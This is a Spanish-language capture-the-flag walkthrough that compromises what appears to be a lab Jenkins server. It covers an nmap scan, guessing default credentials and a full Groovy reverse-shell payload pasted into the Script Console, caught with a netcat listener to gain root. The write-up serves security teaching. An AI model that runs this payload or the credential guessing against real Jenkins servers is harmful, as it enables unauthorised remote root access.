Conceptos importantes:
- CVE --> Common Vulnerabilities and Exposures
- CIA --> Confidentiality, Integrity, Availability

1. **Escaneamos los puertos más comunes con Nmap con los scripts predeterminados y averiguando los servicios que corren.**
```bash
sudo nmap -sVC [target IP]
```
--> 8080 - open - http - Jetty 9.4.39.v20210325

2. **Entramos a la IP desde el navegador por el puerto 8080 y nos encontramos con un panel de login que pone "Welcome to Jenkins!".**
--> Jenkins es un servidor web

3. **Buscamos en Google cuáles son las credenciales por defecto del servidor Jenkins.**
Encontramos que el usuario predeterminado es `admin`. La contraseña se autorellena automáticamente.

4. **Probamos logins básicos por si pudiéramos entrar:**
--> admin admin
--> admin root
--> admin password
--> root root
--> root password --> Entramos con estas credenciales

5. **Vemos un panel donde aparece un Groovy Script en la página principal. Vemos también que usa Jenkins 2.289.1, así que vamos a buscar en Google si hay algún exploit para esta versión de Jenkins.**
Encontramos muchos exploits y varios de ellos son con un script escrito en Groovy. Vamos a usar un exploit para esta versión de Jenkins que nos crea una Reverse Shell con la máquina víctima.

6. **Vamos a pegar el exploit para obtener la Reverse Shell en la Script Console de Jenkins**
Para ello, entramos en el panel de la web, le damos a Manage Jenkins, Buscamos la opción Script Console y tendremos un cuadro de texto donde escribir scripts en Groovy y ejecutarlos, por lo que pegaremos el exploit que hemos encontrado:
```groovy
String host="[My IP]";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
--> No se ejecuta todavía, solo lo pegamos.

7. **Nos ponemos en escucha con NetCat por el puerto 1234 (el que se indica en el script) para recibir la Reverse Shell**
Las opciones son:
- `-n` --> Para que no tenga en cuenta los nombres DNS, solo las IPs.
- `-l` --> Para que se ponga en modo listener.
- `-v` --> Verbose.
- `-p` --> Para indicar el puerto.
```bash
nc -nlvp 1234
```

8. **Volvemos a la web y le damos a Run para ejecutar el Groovy Script**
--> Recibimos la conexión Reverse Shell a través de NetCat.
--> **MACHINE PWNED!**

9. **Además somos `root`. Entramos en el directorio `/root` y encontramos la flag.**
